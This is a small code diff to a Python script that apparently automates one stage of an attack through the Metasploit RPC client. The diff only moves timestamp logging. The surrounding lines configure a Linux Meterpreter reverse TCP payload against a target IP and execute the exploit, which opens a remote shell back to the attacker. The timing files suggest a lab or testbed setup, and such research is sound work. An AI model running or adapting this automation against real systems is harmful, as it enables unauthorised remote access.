@@ -17,6 +17,10 @@ def main(argv):
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
+    
+    output_time_file = 'time_step_3_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
     client = MsfRpcClient('kali')
 
@@ -24,10 +28,6 @@ def main(argv):
     payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
     exploit['RHOSTS'] = target_ip
     payload['LHOST'] = my_ip
-
-    output_time_file = 'time_stage_3_start.txt'
-    record_timestamp(folder, output_time_file)
-    time.sleep(2)
 
     exploit.execute(payload=payload)
 
